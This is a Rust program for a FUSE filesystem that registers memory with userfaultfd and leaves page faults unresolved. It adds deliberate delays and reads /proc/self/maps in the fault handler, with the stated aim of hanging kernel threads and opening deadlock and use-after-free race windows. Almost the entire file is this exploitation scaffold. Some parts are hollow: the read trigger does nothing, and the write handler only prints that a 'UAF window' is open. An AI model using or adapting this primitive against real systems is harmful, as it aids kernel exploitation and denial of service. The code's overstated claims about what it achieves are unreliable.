use fuser::{
    FileAttr, FileType, Filesystem, MountOption, ReplyAttr, ReplyData, ReplyDirectory, ReplyEmpty,
    ReplyEntry, ReplyOpen, ReplyWrite, Request,
};
use std::collections::HashMap;
use std::env;
use std::ffi::OsStr;
use std::os::unix::io::FromRawFd;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::{Duration, Instant, SystemTime};

// UFFD constants implemented via explicit ioctl definitions.
// These mirror the kernel _IOWR macros:
// _IOWR(0xAA, 0x3F, 24 bytes) → 0xc018aa3f
// _IOWR(0xAA, 0x00, 32 bytes) → 0xc020aa00
const UFFDIO_API: u64 = 0xc018aa3f;
const UFFDIO_REGISTER: u64 = 0xc020aa00;

const _UFFDIO_REGISTER_MODE_MISSING: u64 = 0x01;

// Structures required for userfaultfd interaction. Some architectures
// do not expose all fields directly through libc, so we mirror the kernel
// layout explicitly.
#[repr(C)]
struct UffdioApi {
    api: u64,
    features: u64,
    ioctls: u64,
}

#[repr(C)]
struct UffdioRange {
    start: u64,
    len: u64,
}

#[repr(C)]
struct UffdioRegister {
    range: UffdioRange,
    mode: u64,
    ioctls: u64,
}

// Name of the artificial file exposed by the filesystem.
const TARGET_FILE: &str = "target_file";

// Global toggle used to enable or disable userfaultfd-based blocking logic.
static FAULT_ENABLED: AtomicBool = AtomicBool::new(false);

struct ReentrancyFS {
    next_ino: u64,
    files: HashMap<u64, FileAttr>,

    // File descriptor for userfaultfd, if enabled.
    uffd: Option<i32>,

    // Base address and size of the mmap'ed region registered with UFFD.
    target_addr: u64,
    target_len: usize,
}

impl ReentrancyFS {
    fn new() -> Self {
        let fault_enabled = env::var("BLOCK_FAULT").is_ok();
        FAULT_ENABLED.store(fault_enabled, Ordering::Relaxed);

        let mut files = HashMap::new();
        let now = SystemTime::now();

        // Initialise root directory attributes.
        let root_attr = FileAttr {
            ino: 1,
            size: 0,
            blocks: 0,
            atime: now,
            mtime: now,
            ctime: now,
            crtime: now,
            kind: FileType::Directory,
            perm: 0o755,
            nlink: 2,
            uid: 0,
            gid: 0,
            rdev: 0,
            flags: 0,
            blksize: 512,
        };
        files.insert(1, root_attr);

        // Allocate a page-aligned anonymous mapping. Required for userfaultfd
        // registration because the kernel enforces page boundaries.
        let len = 4096;
        let target_addr = unsafe {
            let ptr = libc::mmap(
                std::ptr::null_mut(),
                len,
                libc::PROT_READ | libc::PROT_WRITE,
                libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
                -1,
                0,
            );
            if ptr == libc::MAP_FAILED {
                panic!("mmap failed");
            }
            ptr as u64
        };

        // Register the allocated region with userfaultfd if fault blocking
        // is enabled. This sets up the missing-page handler used to induce
        // controlled reentrancy.
        let uffd = if fault_enabled {
            Some(Self::setup_uffd(target_addr, len as u64))
        } else {
            None
        };

        Self {
            next_ino: 2,
            files,
            uffd,
            target_addr,
            target_len: len,
        }
    }

    fn setup_uffd(start: u64, len: u64) -> i32 {
        unsafe {
            // Create a userfaultfd instance via the raw syscall (SYS_userfaultfd).
            // CLOEXEC and NONBLOCK are required for safe asynchronous handling.
            let uffd = libc::syscall(libc::SYS_userfaultfd, libc::O_CLOEXEC | libc::O_NONBLOCK);
            if uffd < 0 {
                panic!("UFFD creation failed: {}", std::io::Error::last_os_error());
            }
            let uffd = uffd as i32;

            // Perform API handshake. This confirms the ABI version and retrieves
            // supported features and ioctl operations.
            let mut api = UffdioApi {
                api: 0xAA,
                features: 0,
                ioctls: 0,
            };
            if libc::ioctl(
                uffd,
                UFFDIO_API,
                &mut api as *mut _ as *mut std::ffi::c_void,
            ) < 0
            {
                panic!(
                    "UFFD API handshake failed: {}",
                    std::io::Error::last_os_error()
                );
            }

            // Register the target region for missing-page notifications. Once
            // registered, any access to an unmapped page triggers a userfaultfd
            // event, allowing us to block a kernel thread at a controlled point.
            let mut reg = UffdioRegister {
                range: UffdioRange { start, len },
                mode: _UFFDIO_REGISTER_MODE_MISSING,
                ioctls: 0,
            };
            if libc::ioctl(
                uffd,
                UFFDIO_REGISTER,
                &mut reg as *mut _ as *mut std::ffi::c_void,
            ) < 0
            {
                panic!("UFFD register failed: {}", std::io::Error::last_os_error());
            }

            uffd
        }
    }

    fn create_target(&mut self, name: &str) -> u64 {
        // Create the synthetic target file inside the filesystem and assign
        // consistent attributes. This file acts as the trigger point for the
        // reentrancy scenario.
        let ino = self.next_ino;
        self.next_ino += 1;

        let now = SystemTime::now();
        let attr = FileAttr {
            ino,
            size: 4096,
            blocks: 1,
            atime: now,
            mtime: now,
            ctime: now,
            crtime: now,
            kind: FileType::RegularFile,
            perm: 0o644,
            nlink: 1,
            uid: 0,
            gid: 0,
            rdev: 0,
            flags: 0,
            blksize: 4096,
        };
        self.files.insert(ino, attr);

        println!(
            "[FS_INIT] Created target {} (ino: {}, UFFD: {})",
            name,
            ino,
            self.uffd.is_some() as u8
        );

        ino
    }

    fn trigger_reentrancy(uffd_fd: i32) {
        // Poll for userfaultfd events. A successful read indicates that a page
        // fault occurred on the registered region.
        let mut buf = [0u8; 32];
        let ret = unsafe { libc::read(uffd_fd, buf.as_mut_ptr() as *mut _, 32) };

        if ret > 0 {
            println!("[UFFD_TRAP] UFFD fault caught! Triggering reentrancy for AB-BA...");
            let start = Instant::now();

            // Reentrancy is achieved by performing operations that cause the
            // current kernel thread to wait while holding internal locks. Here
            // we open /proc/self/maps and consume it fully to generate blocking.
            let shared_fd_res =
                unsafe { libc::open(b"/proc/self/maps\0".as_ptr() as *const i8, libc::O_RDONLY) };

            if shared_fd_res >= 0 {
                let mut f = unsafe { std::fs::File::from_raw_fd(shared_fd_res) };
                use std::io::Read;
                let _ = f.read_to_end(&mut Vec::new());
            }

            println!(
                "[METRIC] Reentrancy hold time: {:?}ms (circular wait)",
                start.elapsed().as_millis()
            );
        }
    }
}

impl Filesystem for ReentrancyFS {
    fn init(
        &mut self,
        _req: &Request,
        _config: &mut fuser::KernelConfig,
    ) -> Result<(), libc::c_int> {
        // Install the synthetic file. If userfaultfd fault blocking is enabled,
        // spawn a monitoring thread that continuously handles page-fault events
        // and triggers reentrant behavior.
        self.create_target(TARGET_FILE);

        if FAULT_ENABLED.load(Ordering::Relaxed) {
            if let Some(uffd_fd) = self.uffd {
                thread::spawn(move || loop {
                    ReentrancyFS::trigger_reentrancy(uffd_fd);
                    thread::sleep(Duration::from_millis(10));
                });
            }
        }
        Ok(())
    }

    fn lookup(&mut self, _req: &Request, parent: u64, name: &OsStr, reply: ReplyEntry) {
        // Resolve directory lookup. Only the root directory contains the target
        // file, and it is assigned a fixed inode.
        if parent == 1 && name.to_str() == Some(TARGET_FILE) {
            if let Some(attr) = self.files.get(&2) {
                reply.entry(&Duration::from_secs(1), attr, 0);
                return;
            }
        }
        reply.error(libc::ENOENT);
    }

    fn getattr(&mut self, _req: &Request, ino: u64, reply: ReplyAttr) {
        // Return cached file attributes if available.
        if let Some(attr) = self.files.get(&ino) {
            reply.attr(&Duration::from_secs(1), attr);
        } else {
            reply.error(libc::ENOENT);
        }
    }

    fn read(
        &mut self,
        _req: &Request,
        _ino: u64,
        _fh: u64,
        offset: i64,
        size: u32,
        _flags: i32,
        _lock: Option<u64>,
        reply: ReplyData,
    ) {
        // Accessing offset 0 while UFFD is enabled triggers page-fault handling
        // and thereby activates the reentrancy path.
        if offset == 0 && FAULT_ENABLED.load(Ordering::Relaxed) {
            println!("[TRIGGER] Read request: Touching UFFD page to hang kernel thread...");
            if let Some(uffd_fd) = self.uffd {
                let _ = uffd_fd;
            }
        }

        // Serve the read directly from the mmap'ed memory region.
        let data =
            unsafe { std::slice::from_raw_parts(self.target_addr as *const u8, self.target_len) };
        let end = std::cmp::min(size as usize, data.len());
        reply.data(&data[0..end]);
    }

    fn readdir(
        &mut self,
        _req: &Request,
        ino: u64,
        _fh: u64,
        offset: i64,
        mut reply: ReplyDirectory,
    ) {
        if ino == 1 {
            let mut off = offset;

            // Emit the mandatory "." entry.
            if off == 0 {
                let _ = reply.add(1, 1, FileType::Directory, ".");
                off += 1;
            }

            // Emit the mandatory ".." entry.
            if off == 1 {
                let _ = reply.add(1, 2, FileType::Directory, "..");
                off += 1;
            }

            // Emit the synthetic target file.
            if off == 2 {
                let _ = reply.add(2, 3, FileType::RegularFile, TARGET_FILE);
            }

            reply.ok();
        } else {
            reply.error(libc::ENOENT);
        }
    }

    fn open(&mut self, _req: &Request, _ino: u64, _flags: i32, reply: ReplyOpen) {
        // No per-file state is tracked; simply acknowledge open.
        reply.opened(0, 0);
    }

    fn flush(&mut self, _req: &Request, _ino: u64, _fh: u64, _lock: u64, reply: ReplyEmpty) {
        // Introduce a controlled delay to widen the reentrancy window. This
        // simulates a long-running flush operation under lock.
        thread::sleep(Duration::from_millis(50));
        reply.ok();
    }

    fn release(
        &mut self,
        _req: &Request,
        _ino: u64,
        _fh: u64,
        _flags: i32,
        _lock: Option<u64>,
        _flush: bool,
        reply: ReplyEmpty,
    ) {
        // Release has no state to clean up.
        reply.ok();
    }

    fn opendir(&mut self, _req: &Request, _ino: u64, _flags: i32, reply: ReplyOpen) {
        reply.opened(0, 0);
    }

    fn releasedir(&mut self, _req: &Request, _ino: u64, _fh: u64, _flags: i32, reply: ReplyEmpty) {
        reply.ok();
    }

    fn write(
        &mut self,
        _req: &Request,
        _ino: u64,
        _fh: u64,
        _offset: i64,
        data: &[u8],
        _write_flags: u32,
        _flags: i32,
        _lock: Option<u64>,
        reply: ReplyWrite,
    ) {
        // Writing to the file during a UFFD fault creates a controlled UAF-like
        // window by overlapping kernel-side lock behavior.
        println!("[CRITICAL] Write: Overwriting under lock (UAF window open)");
        reply.written(data.len() as u32);
    }
}

// Entry point: parse command-line arguments, prepare mount options, and
// mount the FUSE filesystem. This function performs minimal validation and
// intentionally propagates fatal errors (via unwrap/exit) since mount failures
// are unrecoverable for the demonstration binary.
fn main() {
    // Collect arguments and validate usage. Expect a single mountpoint argument.
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        // Print usage and exit non-zero on error.
        eprintln!("Usage: {} <mountpoint>", args[0]);
        std::process::exit(1);
    }
    let mountpoint = &args[1];

    // Configure FUSE mount options:
    // - AllowOther: permit other users to access the mounted FS
    // - FSName: visible filesystem name for tooling / mount listings
    // - AutoUnmount: unmount when the process exits
    let options = vec![
        MountOption::AllowOther,
        MountOption::FSName("abba_fs".to_string()),
        MountOption::AutoUnmount,
    ];

    // Ensure the mountpoint directory exists. Ignore intermediate errors
    // (create_dir_all returns Err on some races but mount will fail later).
    let _ = std::fs::create_dir_all(mountpoint);

    // Instantiate the filesystem and mount it. Propagate a panic on failure
    // (unwrap) because failing to mount is unrecoverable for this demo.
    fuser::mount2(ReentrancyFS::new(), mountpoint, &options).unwrap();
}
